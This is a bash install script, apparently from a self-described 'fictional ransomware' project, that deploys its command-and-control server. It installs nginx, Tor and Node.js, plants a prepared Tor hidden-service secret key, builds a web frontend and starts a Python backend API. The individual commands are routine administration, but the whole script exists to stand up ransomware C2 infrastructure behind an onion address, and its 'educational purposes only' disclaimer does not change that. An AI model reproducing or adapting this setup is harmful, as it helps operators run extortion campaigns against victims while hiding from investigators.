#!/bin/bash
# !! IMPORTANT !!
# This script is for educational purposes only. It is not intended to be used for malicious purposes.
# Author: M3str3 <nam3str3@protonmail.com>
# ==============================================================================
# This is the script for installing the C2 #2 of my fictional ransomware 
# 
# Use example:
#   ./install.sh 
#

echo "[*] Updating system and installing required packages..."
sudo apt-get update && sudo apt-get install -y nginx tor python3 nodejs

# Install Nginx
echo "[*] Configuring Nginx..."
sudo cp conf/nginx /etc/nginx/sites-available/default
sudo service nginx restart
echo "[+] Nginx installed and restarted."

# Configure TOR
echo "[*] Configuring TOR..."
sudo rm /etc/tor/torrc
sudo cp conf/torrc /etc/tor/torrc
sudo cp conf/key.bin /var/lib/tor/hidden_service/hs_ed25519_secret_key
sudo service tor restart
echo "[+] TOR configuration applied and restarted."

# Install NodeJS
echo "[*] Installing NodeJS dependencies..."
sudo apt-get install -y nodejs
echo "[*] Bulding frontend..."
cd frontend
npm install
npm run build
echo "[*] Setting up frontend..."
cp -r dist/* /var/www/html/.
echo "[+] Frontend setup completed."

cd ../backend/
echo "[*] Installing Python dependencies..."
python3 -m pip install -r requirements.txt
echo "[+] Backend dependencies installed."

echo "[*] Starting backend API..."
python3 api.py
